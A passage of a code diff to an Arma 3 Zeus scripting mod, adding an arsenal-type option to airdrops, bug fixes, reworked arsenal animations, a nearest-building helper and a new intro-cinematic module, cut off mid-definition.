 			private _typeMode = _mode select 0; _dropType = nil; if(count _mode == 2) then {_dropType = _mode select 1;};
 			_typeMode = toLower _typeMode; if(count _mode == 2) then {_dropType = toLower _dropType;}; _vehType = toLower _vehType;
@@ -6383,7 +6563,11 @@ MAZ_EZM_fnc_initFunction = {
 			detach _smoke;
 			detach _light;
 			if(_mode select 0 == 'arsenal') then {
-				[_veh,nil,true,false,false] call JAM_EZM_fnc_createAIOArsenalModule;
+				if(_aioArsenal) then {
+					[_veh,nil,true,false,false] call JAM_EZM_fnc_createAIOArsenalModule;
+				} else {
+					["AmmoboxInit",[_veh,true]] spawn BIS_fnc_arsenal;
+				};
 			};
 			if(_vehType == 'B_Heli_Transport_03_F') then {
 				sleep 20;
@@ -6405,7 +6589,12 @@ MAZ_EZM_fnc_initFunction = {
 				[
 					"TOOLBOX",
 					"Airdrop Type",
-					[false,["Arsenal","Vehicle"]]
+					[false,["Arsenal","Vehicle"]],
+					{true},
+					{
+						params ["_display","_value"];
+						_display setVariable ["MAZ_EZM_isVehicle",_value];
+					}
 				],
 				[
 					"LIST",
@@ -6440,7 +6629,20 @@ MAZ_EZM_fnc_initFunction = {
 							"FV-720 Mora"
 						],
 						0
-					]
+					],
+					{
+						params ["_display"];
+						_display getVariable "MAZ_EZM_isVehicle";
+					}
+				],
+				[
+					"TOOLBOX:YESNO",
+					"AIO Arsenal?",
+					[true],
+					{
+						params ["_display"];
+						!(_display getVariable "MAZ_EZM_isVehicle");
+					}
 				],
 				[
 					"LIST",
@@ -6473,7 +6675,7 @@ MAZ_EZM_fnc_initFunction = {
 				]
 			],{
 				params ["_values","_args","_display"];
-				_values params ["_type","_payloadType","_dir","_aircraft","_side","_radioSFX"];
+				_values params ["_type","_payloadType","_aioArsenal","_dir","_aircraft","_side","_radioSFX"];
 
 				private _typeArray = [];
 				if(_type) then {
@@ -6509,12 +6711,18 @@ MAZ_EZM_fnc_initFunction = {
 					_typeArray pushBack 'Arsenal';
 				};
 
-				[_args,_typeArray,_dir,_aircraft,_side,_radioSFX] spawn MAZ_EZM_fnc_airDropSupportModule; 
+				[_args,_typeArray,_aioArsenal,_dir,_aircraft,_side,_radioSFX] spawn MAZ_EZM_fnc_airDropSupportModule; 
 				_display closeDisplay 1;
 			},{
 				params ["_values","_args","_display"];
 				_display closeDisplay 2;
-			},[true] call MAZ_EZM_fnc_getScreenPosition] call MAZ_EZM_fnc_createDialog;
+			},
+			[true] call MAZ_EZM_fnc_getScreenPosition,
+			{
+				params ["_display"];
+				_display setVariable ["MAZ_EZM_isVehicle",false];
+			}
+			] call MAZ_EZM_fnc_createDialog;
 		};
 
 		MAZ_EZM_fnc_heliEvacExec = {
@@ -6753,7 +6961,7 @@ MAZ_EZM_fnc_initFunction = {
 				params ["_values","_pos","_display"];
 				_values params ["_directionIndex","_side","_helicopterType","_numToLeave"];
 				_display closeDisplay 1;
-				private _dir = switch (_directionIndex) do {
+				private _dir = switch (parseNumber _directionIndex) do {
 					case 0: {'North'};
 					case 1: {'South'};
 					case 2: {'East'};
@@ -6780,7 +6988,7 @@ MAZ_EZM_fnc_initFunction = {
 			private _fnc_processParams = {
 				params ["_pos","_side","_groupType","_dir","_endPos"];
 				private _factionData = [_side] call MAZ_EZM_fnc_getAllFactionGroups;
-				private _groupCfg = [_factionData,_groupType] call MAZ_EZM_fnc_getGroupDataFromIndex;
+				private _groupCfg = [_factionData,parseNumber _groupType] call MAZ_EZM_fnc_getGroupDataFromIndex;
 				_side = switch (getNumber(_groupCfg >> "side")) do {
 					case 0: {east};
 					case 1: {west};
@@ -6791,7 +6999,7 @@ MAZ_EZM_fnc_initFunction = {
 					case east: {"O_Heli_Light_02_unarmed_F"};
 					case independent: {"I_Heli_Transport_02_F"};
 				};
-				_dir = switch (_dir) do {
+				_dir = switch (parseNumber _dir) do {
 					case 0: {0};
 					case 1: {180};
 					case 2: {90};
@@ -6832,6 +7040,7 @@ MAZ_EZM_fnc_initFunction = {
 			}forEach _units;
 
 			private _heliPad1 = "Land_HelipadEmpty_F" createVehicle _pos;
+			_heliPad1 setPos _pos;
 			private _waypointPickup = _grp addWaypoint [position _heliPad1,0];
 			_waypointPickup setWaypointType "TR UNLOAD";
 
@@ -6899,12 +7108,20 @@ MAZ_EZM_fnc_initFunction = {
 				if(!(_side in _sides)) then {continue};
 				{
 					private _name = getText (_x >> "name");
+					private _cfgs = if(_name == "Spetsnaz") then {
+						("true" configClasses (_x >> "SpecOps"))
+					} else {
+						("true" configClasses (_x >> "Infantry"))
+					};
 					private _groups = [];
 					{
 						private _groupName = getText (_x >> "name");
 						_groups pushBack [_groupName,_x];
-					}forEach ("true" configClasses (_x >> "Infantry"));
+					}forEach _cfgs;
 					private _flag = getText (configfile >> "CfgFactionClasses" >> configName _x >> "flag");
+					if(_flag == "" && _name == "FIA") then {
+						_flag = "\a3\Data_f\Flags\flag_FIA_co.paa";
+					};
 					private _icon = getText (configfile >> "CfgFactionClasses" >> configName _x >> "icon");
 					_factions pushBack [_name,_flag,_icon,_groups];
 				}forEach ("true" configClasses _x)
@@ -6955,8 +7172,11 @@ MAZ_EZM_fnc_initFunction = {
 			],{
 				params ["_values","_pos","_display"];
 				_values params ["_side","_dir"];
-				_display closeDisplay 1;
+				if(_side == civilian) exitWith {
+					["You can't reinforce with a civilian group!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;
+				};
 				[_side,_dir] spawn MAZ_EZM_fnc_callReinforcementsChooseGroup;
+				_display closeDisplay 1;
 			},{
 				params ["_values","_args","_display"];
 				_display closeDisplay 2;
@@ -6976,6 +7196,7 @@ MAZ_EZM_fnc_initFunction = {
 					(_listData select 1) pushBack [format ["%1 (%2)",_name,_groupName],"",_flag];
 				}forEach _groups;
 			}forEach _factions;
+			
 			["Spawn Reinforcements (Group Select)",[
 				[
 					"LIST",
@@ -6990,10 +7211,11 @@ MAZ_EZM_fnc_initFunction = {
 				
 				private _reinforcementsParams = [_pos,_side,_groupType,_dir,[]];
 				private _helipadMarker = createVehicle ["Land_HelipadEmpty_F",_pos,[],0,"CAN_COLLIDE"];
+				_helipadMarker setPosATL _pos;
 
 				["Reinforcements Destination on Foot",{
 					params ["_objects","_position","_args","_shift","_ctrl","_alt"];
-					deleteVehicle _units;
+					deleteVehicle _objects;
 					_args set [4,_position];
 					_args spawn MAZ_EZM_fnc_spawnReinforcements;
 				},_helipadMarker,_reinforcementsParams] call MAZ_EZM_fnc_selectSecondaryPosition;
@@ -7064,8 +7286,13 @@ MAZ_EZM_fnc_initFunction = {
 				{
 					params ["_values","_pos","_display"];
 					_values params ["_roundType","_radius","_rounds","_min","_max"];
-					[_pos,_roundType,_radius,_rounds,[_min,_max]] spawn BIS_fnc_fireSupportVirtual;
 					_display closeDisplay 1;
+					[_pos,_roundType,_radius,_rounds,_min,_max] spawn {
+						params ["_pos","_roundType","_radius","_rounds","_min","_max"];
+						[_pos,_roundType,_radius * 1.1,1,[_min,_max],{false},(_radius * 0.75)] spawn BIS_fnc_fireSupportVirtual;
+						sleep (5 + random 5);
+						[_pos,_roundType,_radius,_rounds,[_min,_max]] spawn BIS_fnc_fireSupportVirtual;
+					};
 				},
 				{
 					params ["_values","_args","_display"];
@@ -7161,115 +7388,64 @@ MAZ_EZM_fnc_initFunction = {
 							};
 							if(_this select 3) then {
 								private _arsenalAnims = [
-									{
-										player playActionNow "Salute";
-									}, {
-										[player, "acts_civilidle_1"] remoteExec["switchMove"];
-									}, {
-										[player, "acts_civilListening_2"] remoteExec["switchMove"];
-									}, {
-										[player, "acts_commenting_on_fight_loop"] remoteExec["switchMove"];
-									}, {
-										[player, "acts_gallery_visitor_01"] remoteExec["switchMove"];
-									}, {
-										[player, "acts_gallery_visitor_02"] remoteExec["switchMove"];
-									}, {
-										[player, "acts_hilltop_calibration_loop"] remoteExec["switchMove"];
-									}, {
-										[player, "acts_kore_talkingoverradio_loop"] remoteExec["switchMove"];
-									}, {
-										[player, "acts_staticPose_photo"] remoteExec["switchMove"];
-									}, {
-										player playActionNow "gear";
-									}, {
-										[player, "Acts_Taking_Cover_From_Jets"] remoteExec["switchMove"];
-									}, {
-										[player, "Acts_standingSpeakingUnarmed"] remoteExec["switchMove"];
-									}, {
-										player playMoveNow "acts_Mentor_Freeing_Player";
-									}, {
-										[player, "acts_kore_talkingOverRadio_In"] remoteExec["switchMove"];
-									}, {
-										[player, "acts_kore_idleNoWeapon_In"] remoteExec["switchMove"];
-									}, {
-										[player, "Acts_JetsOfficerSpilling"] remoteExec["switchMove"];
-									}, {
-										player playMoveNow "Acts_Hilltop_Calibration_Pointing_Left";
-									}, {
-										player playMoveNow "Acts_Hilltop_Calibration_Pointing_Right";
-									}, {
-										[player, "Acts_Grieving"] remoteExec["switchMove"];
-									}
+									"Salute",
+									"gear",
+									"acts_Mentor_Freeing_Player",
+									"Acts_Hilltop_Calibration_Pointing_Left",
+									"Acts_Hilltop_Calibration_Pointing_Right",
+									[player,"acts_civilidle_1"],
+									[player,"acts_civilListening_2"],
+									[player,"acts_commenting_on_fight_loop"],
+									[player,"acts_gallery_visitor_01"],
+									[player,"acts_gallery_visitor_02"],
+									[player,"acts_hilltop_calibration_loop"],
+									[player,"acts_kore_talkingoverradio_loop"],
+									[player,"acts_staticPose_photo"],
+									[player,"Acts_Taking_Cover_From_Jets"],
+									[player,"Acts_standingSpeakingUnarmed"],
+									[player,"acts_kore_talkingOverRadio_In"],
+									[player,"acts_kore_idleNoWeapon_In"],
+									[player,"Acts_JetsOfficerSpilling"],
+									[player,"Acts_Grieving"]
+
 								];
 								private _arsenalAnimsAdd = switch (currentWeapon player) do {
 									case (primaryWeapon player): {
 										[
-											{
-												[player, "acts_briefing_SA_loop"] remoteExec["switchMove"];
-											}, {
-												[player, "acts_getAttention_loop"] remoteExec["switchMove"];
-											}, {
-												[player, "acts_millerIdle"] remoteExec["switchMove"];
-											}, {
-												player playMoveNow "Acts_SupportTeam_Right_ToKneelLoop";
-											}, {
-												player playMoveNow "Acts_SupportTeam_Left_ToKneelLoop";
-											}, {
-												player playMoveNow "Acts_SupportTeam_Front_ToKneelLoop";
-											}, {
-												player playMoveNow "Acts_SupportTeam_Back_ToKneelLoop";
-											}, {
-												[player, "Acts_starGazer"] remoteExec["switchMove"];
-											}, {
-												player playMoveNow "acts_RU_briefing_Turn";
-											}, {
-												player playMoveNow "acts_RU_briefing_point";
-											}, {
-												player playMoveNow "acts_RU_briefing_point_tl";
-											}, {
-												player playMoveNow "acts_RU_briefing_move";
-											}, {
-												[player, "acts_rifle_operations_zeroing"] remoteExec["switchMove"];
-											}, {
-												player playMoveNow "acts_rifle_operations_right";
-											}, {
-												player playMoveNow "acts_rifle_operations_left";
-											}, {
-												player playMoveNow "acts_rifle_operations_front";
-											}, {
-												player playMoveNow "acts_rifle_operations_checking_chamber";
-											}, {
-												player playMoveNow "acts_rifle_operations_barrel";
-											}, {
-												player playMoveNow "acts_rifle_operations_back";
-											}, {
-												player playMoveNow "acts_pointing_up";
-											}, {
-												player playMoveNow "acts_pointing_down";
-											}, {
-												player playMoveNow "acts_peering_up";
-											}, {
-												player playMoveNow "acts_peering_down";
-											}, {
-												player playMoveNow "acts_peering_front";
-											}, {
-												[player, "Acts_Helping_Wake_Up_1"] remoteExec["switchMove"];
-											}
-										]
+											"Acts_SupportTeam_Right_ToKneelLoop",
+											"Acts_SupportTeam_Left_ToKneelLoop",
+											"Acts_SupportTeam_Front_ToKneelLoop",
+											"Acts_SupportTeam_Back_ToKneelLoop",
+											"acts_RU_briefing_Turn",
+											"acts_RU_briefing_point",
+											"acts_RU_briefing_point_tl",
+											"acts_RU_briefing_move",
+											"acts_rifle_operations_right",
+											"acts_rifle_operations_left",
+											"acts_rifle_operations_front",
+											"acts_rifle_operations_checking_chamber",
+											"acts_rifle_operations_barrel",
+											"acts_rifle_operations_back",
+											"acts_pointing_up",
+											"acts_pointing_down",
+											"acts_peering_up",
+											"acts_peering_down",
+											"acts_peering_front",
+											[player,"acts_briefing_SA_loop"],
+											[player, "acts_getAttention_loop"],
+											[player, "acts_millerIdle"],
+											[player, "Acts_starGazer"],
+											[player, "acts_rifle_operations_zeroing"],
+											[player, "Acts_Helping_Wake_Up_1"]
+										];
 									};
 									case (handgunWeapon player): {
 										[
-											{
-												[player, "acts_examining_device_player"] remoteExec["switchMove"];
-											}, {
-												[player, "acts_executioner_standingloop"] remoteExec["switchMove"];
-											}, {
-												player playMoveNow "Acts_ViperMeeting_A_End";
-											}, {
-												player playMoveNow "Acts_UGV_Jamming_Loop";
-											}, {
-												player playMoveNow "Acts_starterPistol_Fire";
-											}
+											[player, "acts_examining_device_player"],
+											[player, "acts_executioner_standingloop"],
+											"Acts_ViperMeeting_A_End",
+											"Acts_UGV_Jamming_Loop",
+											"Acts_starterPistol_Fire"
 										]
 									};
 									default {
@@ -7278,7 +7454,11 @@ MAZ_EZM_fnc_initFunction = {
 								};
 								_arsenalAnims = _arsenalAnims + _arsenalAnimsAdd;
 								private _playAnim = selectRandom _arsenalAnims;
-								call _playAnim;
+								if(typeName _playAnim == "STRING") then {
+									player playMoveNow _playAnim;
+								} else {
+									_playAnim remoteExec ["switchMove"];
+								};
 								if !(isNil "M9SD_EH_ResetPlayerAnimsOnArsenalClosed") then {
 									(findDisplay 46) displayRemoveEventHandler["keyDown", M9SD_EH_ResetPlayerAnimsOnArsenalClosed];
 								};
@@ -7298,7 +7478,7 @@ MAZ_EZM_fnc_initFunction = {
 										player playMoveNow "";
 										player switchMove "";
 										if (isMultiplayer) then {
-											[player, ""] remoteExec["switchMove"]
+											[player, ""] remoteExec ["switchMove"]
 										};
 										"arsenalNotification1"
 										cutFadeOut 0;
@@ -7613,13 +7793,13 @@ MAZ_EZM_fnc_initFunction = {
 								];
 							} forEach _arsenals;
 						}];
-					}] remoteExec["spawn", 0, "M9SD_JIP_smallArsenalIcons"];
+					}] remoteExec ["spawn", 0, "M9SD_JIP_smallArsenalIcons"];
 				};
 				[_arsenalBox] call M9SD_fnc_smallArsenalMarkers;
 			};
-			[_arsenalBox, false] remoteExec["allowDamage"]; 
+			[_arsenalBox, false] remoteExec ["allowDamage"]; 
 			{
-				[_x, false] remoteExec["allowDamage"];
+				[_x, false] remoteExec ["allowDamage"];
 			}forEach attachedObjects _arsenalBox;
 			[_arsenalBox] call MAZ_EZM_fnc_addObjectToInterface;
 			[attachedObjects _arsenalBox] call MAZ_EZM_fnc_addObjectToInterface;
@@ -7821,7 +8001,7 @@ MAZ_EZM_fnc_initFunction = {
 			private _positionOfCrash = getPos _craterCrash;
 			private _smokeObject = [_positionOfCrash] call MAZ_EZM_fnc_createSmokeForCrash;
 			private _crashObjects = [_craterCrash,_crashGhosthawk,_smokeObject];
-			["TaskAssignedIcon",["A3\UI_F\Data\Map\Markers\Military\warning_CA.paa","Helicopter Crash"]] remoteExec ['BIS_fnc_showNotification',0];
+			["TaskAssignedIcon",["A3\UI_F\Data\Map\Markers\Military\warning_CA.paa","Helicopter Crash"]] remoteExec ['BIS_fnc_showNotification'];
 			private _heliCrashMarker = createMarker ["heliCrashMarker_0",_positionOfCrash];
 			_heliCrashMarker setMarkerText "Helicopter Crash";
 			_heliCrashMarker setMarkerType "mil_objective";
@@ -7847,7 +8027,7 @@ MAZ_EZM_fnc_initFunction = {
 					sleep 1;
 				};
 				if(({alive _x} count _soldiersArray) == 0) then {
-					["TaskSucceeded",["","Helicopter Crash Secured"]] remoteExec ['BIS_fnc_showNotification',0];
+					["TaskSucceeded",["","Helicopter Crash Secured"]] remoteExec ['BIS_fnc_showNotification'];
 					private _randomAmount = selectRandom [1,2];
 					private _rewardBoxes = [];
 					for "_i" from 0 to (_randomAmount-1) do {
@@ -7863,7 +8043,7 @@ MAZ_EZM_fnc_initFunction = {
 					} forEach _crashObjects + _soldiersArray + _rewardBoxes;
 				};
 				if(_timer <= 0 && (({alive _x} count _soldiersArray) != 0)) then {
-					["TaskFailed",["","Helicopter Crash Not Secured"]] remoteExec ['BIS_fnc_showNotification',0];
+					["TaskFailed",["","Helicopter Crash Not Secured"]] remoteExec ['BIS_fnc_showNotification'];
 					deleteMarker _heliCrashMarker;
 					{
 						deleteVehicle _x;
@@ -8263,7 +8443,6 @@ MAZ_EZM_fnc_initFunction = {
 			_convoyGroup setFormation "COLUMN";
 			_convoyGroup setSpeedMode "LIMITED";
 
-			enableEnvironment [false,true];
 			[[false,true]] remoteExec ['enableEnvironment',2];
 
 			{
@@ -8280,7 +8459,7 @@ MAZ_EZM_fnc_initFunction = {
 			private _cargoVehicles = [];
 			{
 				_x allowCrewInImmobile true;
-				[_x,2] remoteExec ['lock',0,_x];
+				[_x,2] remoteExec ["lock"];
 				_x limitSpeed 57;
 				(driver _x) limitSpeed 57;
 				_x forceSpeed 15.84;
@@ -8321,7 +8500,7 @@ MAZ_EZM_fnc_initFunction = {
 				_markers pushBack _checkpointMarker;
 			}forEach _markerLocations;
 
-			["TaskAssignedIcon",["A3\UI_F\Data\Map\Markers\Military\warning_CA.paa","A Convoy is Moving"]] remoteExec ['BIS_fnc_showNotification',0];
+			["TaskAssignedIcon",["A3\UI_F\Data\Map\Markers\Military\warning_CA.paa","A Convoy is Moving"]] remoteExec ['BIS_fnc_showNotification'];
 
 			[_vehicles] spawn {
 				params ["_vehicles"];
@@ -8346,7 +8525,7 @@ MAZ_EZM_fnc_initFunction = {
 							} count _vehicles) != 0
 						)
 					};
-					["TaskAssignedIcon",["A3\UI_F\Data\Map\Markers\Military\warning_CA.paa",format ["The Convoy Has Reached Checkpoint %1",_i + 1]]] remoteExec ['BIS_fnc_showNotification',0];
+					["TaskAssignedIcon",["A3\UI_F\Data\Map\Markers\Military\warning_CA.paa",format ["The Convoy Has Reached Checkpoint %1",_i + 1]]] remoteExec ['BIS_fnc_showNotification'];
 				};
 			};
 
@@ -8356,7 +8535,7 @@ MAZ_EZM_fnc_initFunction = {
 				waitUntil {currentWaypoint _convoyGroup >= _numWaypoints || (({alive _x} count _soldiersArray) == 0) || (({alive _x} count _trucks) == 0)};
 				if(({alive _x} count _soldiersArray) == 0) exitWith {
 					comment "Success";
-					["TaskSucceeded",["","Convoy Stopped!"]] remoteExec ['BIS_fnc_showNotification',0];
+					["TaskSucceeded",["","Convoy Stopped!"]] remoteExec ['BIS_fnc_showNotification'];
 					{
 						deleteMarker _x;
 					}forEach _markers;
@@ -8372,7 +8551,7 @@ MAZ_EZM_fnc_initFunction = {
 				};
 				if(currentWaypoint _convoyGroup >= _numWaypoints) exitWith {
 					comment "Failure";
-					["TaskFailed",["","Convoy Reached Their End"]] remoteExec ['BIS_fnc_showNotification',0];
+					["TaskFailed",["","Convoy Reached Their End"]] remoteExec ['BIS_fnc_showNotification'];
 					{
 						deleteMarker _x;
 					}forEach _markers;
@@ -8386,7 +8565,7 @@ MAZ_EZM_fnc_initFunction = {
 				};
 				if(({alive _x} count _trucks) == 0) exitWith {
 					comment "Failure";
-					["TaskFailed",["","Convoy Cargo Destroyed!"]] remoteExec ['BIS_fnc_showNotification',0];
+					["TaskFailed",["","Convoy Cargo Destroyed!"]] remoteExec ['BIS_fnc_showNotification'];
 					{
 						deleteMarker _x;
 					}forEach _markers;
@@ -8668,7 +8847,7 @@ MAZ_EZM_fnc_initFunction = {
 			[_units] call MAZ_EZM_fnc_addObjectToInterface;
 
 			if(_notify) then {
-				["TaskAssignedIcon",["A3\UI_F\Data\Map\Markers\Military\warning_CA.paa",_townAlert]] remoteExec ['BIS_fnc_showNotification',0];
+				["TaskAssignedIcon",["A3\UI_F\Data\Map\Markers\Military\warning_CA.paa",_townAlert]] remoteExec ['BIS_fnc_showNotification'];
 			};
 
 			true
@@ -9127,7 +9306,7 @@ MAZ_EZM_fnc_initFunction = {
 				private _dir = vectorDir _building;
 				private _up = vectorUp _building;
 				private _worldPos = getPosWorld _building;
-				[_building,true] remoteExec ['hideObject',0,_building];
+				[_building,true] remoteExec ["hideObjectGlobal",2];
 				[_building,false] remoteExec ['allowDamage'];
 				private _temp = _building;
 				_building = _buildingType createVehicle [0,0,0];
@@ -9185,6 +9364,21 @@ MAZ_EZM_fnc_initFunction = {
 				call MAZ_EZM_fnc_localBuildingDestruct;
 			};
 
+		};
+
+		MAZ_EZM_fnc_getNearestBuilding = {
+			params [
+				["_position",[0,0,0],[[],objNull]],
+				["_radius",50,[0]],
+				["_2d",false,[false]]
+			];
+			if(_position isEqualTo [0,0,0]) exitWith {["Provide a position argument to getNearestBuilding!","addItemFailed"] call MAZ_EZM_fnc_systemMessage};
+			if(_position isEqualType objNull) then {_position = getPos _position;};
+			private _nearestBuildings = (nearestObjects [_position, ["building"], _radius, _2d]) select {
+
+				count ([_x] call BIS_fnc_buildingPositions) > 0
+			};
+			(_nearestBuildings select 0)
 		};
 
 		MAZ_EZM_fnc_createBuildingInteriorCall = {
@@ -9309,7 +9503,7 @@ MAZ_EZM_fnc_initFunction = {
 			if(_isTerrainBuilding) then {
 				comment "Replace building, terrain buildings don't invoke BuildingChanged MEH";
 				_building setVariable ["MAZ_EZM_hasCompSetup",false,true];
-				[_building,false] remoteExec ['hideObject',0,_building];
+				_building hideObjectGlobal false;
 				[_building,true] remoteExec ['allowDamage'];
 				private _buildings = nearestObjects [_building,[typeOf _building],20,true];
 				{
@@ -9352,6 +9546,457 @@ MAZ_EZM_fnc_initFunction = {
 			};
 		};
 		call MAZ_EZM_fnc_checkForInteriorData;
+
+	comment "Cinematics";
+
+		HYPER_EZM_fnc_showIntertitles = {
+			params ["_line1", "_line2"];
+			sleep 3;
+			_line1 spawn BIS_fnc_infoText;
+			sleep 5;
+			_line2 spawn BIS_fnc_infoText;
+		};
+
+		HYPER_EZM_fnc_splitMaxLine = {
+			params ["_inputString"];
+			private _maxLength = 22;
+			private _words = _inputString splitString " ";
+			private _lines = [];
+			private _currentLine = "";
+			
+			{
+				private _word = _x;
+				if (_currentLine isEqualTo "") then {
+					_currentLine = _word;
+					continue;
+				};
+
+				private _tentativeLine = format ["%1 %2", _currentLine, _word];
+				if (count _tentativeLine <= _maxLength) then {
+					_currentLine = _tentativeLine;
+					continue;
+				};
+				
+				_lines pushBack _currentLine;
+				_currentLine = _word;
+			} forEach _words;
+			
+			if (!(_currentLine isEqualTo "")) then {
+				_lines pushBack _currentLine;
+			};
+			
+			_lines
+		};
+
+		HYPER_EZM_fnc_remotePostProcessing = {
+			params [
+				["_postProcessValues", [1,1,0,[0,0,0,0],[1,1,1,1],[0,0,0,0]]],
+				["_targets", allPlayers]
+			];
+			HYPER_PP_CC_Cinematic = ppEffectCreate ["colorCorrections",2090];
+			HYPER_PP_CC_Cinematic ppEffectAdjust _postProcessValues;
+			HYPER_PP_CC_Cinematic ppEffectCommit 0;
+			HYPER_PP_CC_Cinematic ppEffectEnable true;
+		};
+
+		HYPER_EZM_fnc_handleIntroCinematic = {
+			params ["_cinematicType","_backgroundSong","_intertitles", "_zeusCanSeeCutscene", "_postProcess", "_target"];
+
+			["Intro cinematic initiated for all players.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
+
+			comment "If zeus shouldn't see the cutscene, we need to get the player set differenced with zeus player set";
+			private _zeusPlayers = allCurators apply {getAssignedCuratorUnit _x};
+			private _allPlayers = if(_zeusCanSeeCutscene) then {
+				allPlayers;
+			} else {
+				allPlayers - _zeusPlayers;
+			};
+
+			comment "Get mission name";
+			private _briefingName = missionNamespace getVariable ["bis_fnc_moduleMissionName_name",""];
+			if (_briefingName == "") then {
+				_briefingName = briefingName;
+			};
+
+			comment "Get zeus name(s)";
+			private _author = "";
+			if (count allcurators > 0) then {
+				_authors = [];
+				{
+					_curatorPlayer = getAssignedCuratorUnit _x;
+					if (isPlayer _curatorPlayer) then {_authors set [count _authors,name _curatorPlayer];};
+				} foreach allCurators;
+
+				{
+					private _prefix = "";
+					if (_foreachindex > 0) then {
+						_prefix = if (_foreachindex == count _authors - 1) then {" &amp; "} else {", "};
+					};
+					_author = _author + _prefix + _x;
+				} foreach _authors;
+			} else {
+				_author = getText (missionconfigfile >> "onLoadName");
+			};
+			if (_author != "") then {_author = format [localize "STR_FORMAT_AUTHOR_SCRIPTED",_author];};
+
+			comment "Disable simulation on any vehicles to avoid crashing mid cutscene";
+			{
+				if (_x != vehicle _x) then {
+					[vehicle _x, false] remoteExec ["enableSimulationGlobal", 2];
+				};
+			} forEach allPlayers;
+
+			comment "Show intro titles";
+			private _track = switch (_backgroundSong) do {
+				case "epic": {"Music_Arrival"};
+				case "action": {"EventTrack02a_F_EPB"};
+				case "stealth": {"AmbientTrack02d_F_EXP"};
+				case "random": {
+					selectRandom ["EventTrack01a_F_EPA","EventTrack01a_F_EPB","EventTrack01_F_EPA","EventTrack03_F_EPB","EventTrack03a_F_EPB","EventTrack02b_F_EPC"];
+				};
+				default {"EventTrack01a_F_EPA"};
+			};
+			[_track] remoteExec ["playMusic",_allPlayers];
+
+			comment "Close Zeus interface so it looks nicer";
+			[[], {
+				if(!isNull (findDisplay 312)) then {
+					(findDisplay 312) closeDisplay 0;
+				};
+			}] remoteExec ["spawn",_zeusPlayers];
+
+			private _delay = 6;
+			[0, _delay, true, true] remoteExec ["BIS_fnc_cinemaBorder", _allPlayers];
+			[["", "BLACK", _delay]] remoteExec ["cutText", _allPlayers];
+
+			[format["<t color='#ffffff' font='PuristaBold' size='2'>%1</t><t color='#B57F50' font='TahomaB' size='0.6'><br />%2</t>",_briefingName, _author],0,0.3,4,1,0,789] remoteExec ["BIS_fnc_dynamicText", _allPlayers];
+
+			sleep _delay;
+
+			[["", "PLAIN", 2]] remoteExec ["cutText", _allPlayers];
+			comment "cutRsc [""SplashNoise"", ""PLAIN""];";
+
+			comment "Show intertitles";
+			private _line1 = [_intertitles # 0] call HYPER_EZM_fnc_splitMaxLine;
+			private _line2 = [_intertitles # 1] call HYPER_EZM_fnc_splitMaxLine;
+			
+			[[_line1, _line2], HYPER_EZM_fnc_showIntertitles] remoteExec ["spawn", _allPlayers];
+
+			comment "Post processing";
+			switch (_postProcess) do {
+				case "none": {
+					[[],HYPER_EZM_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
+				};
+				case "highcontrast": {
+					[[[1, 0.9, -0.002, [0.0, 0.0, 0.0, 0.0], [1.0, 0.6, 0.4, 0.6],  [0.199, 0.587, 0.114, 0.0]]],HYPER_EZM_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
+				};
+				case "blue": {
+					[[[1, 1, 0, [0.0, 0.0, 0.0, 0.0], [0.6, 0.6, 1.8, 0.7],  [0.199, 0.587, 0.114, 0.0]]],HYPER_EZM_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
+				};
+				case "dull": {
+					[[[1, 0.8, -0.002, [0.0, 0.0, 0.0, 0.0], [0.6, 0.7, 0.8, 0.65],  [0.199, 0.587, 0.114, 0.0]]],HYPER_EZM_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
+				};
+				case "yellowgamma": {
+					[[[1, 1, 0, [0.0, 0.0, 0.0, 0.0], [1.8, 1.8, 0.3, 0.7],  [0.199, 0.587, 0.114, 0.0]]],HYPER_EZM_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
+				};
+				case "greengamma": {
+					[[[1, 1, 0, [0.0, 0.0, 0.0, 0.0], [0.6, 1.4, 0.6, 0.7],  [0.199, 0.587, 0.114, 0.0]]],HYPER_EZM_fnc_remotePostProcessing] remoteExec ["call", _allPlayers];
+				};
+			};
+
+			if (_cinematicType == "Flyby") then {
+				comment "in flyby mode, we select the module location as our target, and the camera paths are automatically designated at 0 and 90 degrees";
+				HYPER_fnc_remoteCamera = {
+					params ["_target"];
+					private _zeus = !isNull (getAssignedCuratorLogic player);
+					private _camTarget = "Land_HelipadEmpty_F" createVehicleLocal _target;
+					private _circleRadius = 200;
+					private _camHeight = 200;
+					private _camSrc0 = [_target select 0, (_target select 1) + _circleRadius, (_target select 2) + _camHeight];
+					private _camSrc90 = [(_target select 0) + _circleRadius, _target select 1, (_target select 2) + _camHeight];
+					
+					private _camera = "camera" camCreate _camSrc0;
+					_camera cameraEffect ["internal", "back"];
+					_camera camPrepareTarget _camTarget;
+					_camera camSetFov 1;
+					_camera camCommitPrepared 0;
+
+					_camera camPreparePos _camSrc90;
+					_camera camCommitPrepared 15;
+					waitUntil { camCommitted _camera };
+					cutRsc ["RscStatic", "PLAIN"];
+					sleep 0.4;
+
+					_camera cameraEffect ["terminate", "back"];
+					camDestroy _camera;
+
+					comment "Remove color correction right after cutscene is done so we don't have to remoteExec it";
+					ppEffectDestroy HYPER_PP_CC_Cinematic;
+
+					comment "Re-enable simulation on player vehicles";
+					if(player != vehicle player) then {
+						[vehicle player, true] remoteExec ["enableSimulationGlobal", 2];
+					};
+					
+					cutText ["", "BLACK IN", 2];
+					[1, 2, true, true] call BIS_fnc_cinemaBorder;
+					if(_zeus) then {
+						sleep 0.2;
+						openCuratorInterface;
+					};
+				};
+				[[_target],HYPER_fnc_remoteCamera] remoteExec ["spawn", _allPlayers];
+			};
+		};
+
+		HYPER_EZM_fnc_introCinematicModule = {
+			params ["_entity"];
+			private _target = [true] call MAZ_EZM_fnc_getScreenPosition;
+			private _dialogTitle = "Intro Cinematic";
+			private _content = [
+				[
+					"COMBO",
+					"Cinematic Type",
+					[
+						["Flyby"],
+						["Flyby"],
+						0
+					]
+				],
+				[
+					"COMBO",
+					"Background Song",
+					[
+						["random", "epic", "action", "stealth"],
+						["Random Event Track", "Epic", "Action", "Stealth"],
+						0
+					]
+				],
+				[
+					"EDIT",
+					"Intertitle 1",
+					[
+						"",
+						1
+					]
+				],
+				[
+					"EDIT",
+					"Intertitle 2",
+					[
+						"",
+						1
+					]
+				],
+				[
+					"TOOLBOX:YESNO",
